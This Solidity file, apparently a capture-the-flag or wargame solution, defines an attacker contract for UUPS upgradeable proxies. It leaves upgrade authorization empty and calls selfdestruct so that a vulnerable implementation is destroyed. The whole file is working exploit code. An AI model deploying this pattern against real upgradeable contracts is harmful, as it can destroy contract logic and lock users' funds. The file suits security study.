//SPDX-License-Identifier:MIT
pragma solidity 0.8.19;

import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

contract AuthorizerUpgradeableAttacker is UUPSUpgradeable {
    address private immutable s_player;

    error OriginIsNotPlayer();

    constructor() {
        s_player = msg.sender;
    }

    function exploit() external {
        if (tx.origin != s_player) {
            revert OriginIsNotPlayer();
        }
        selfdestruct(payable(s_player));
    }

    function _authorizeUpgrade(address imp) internal override {}
}
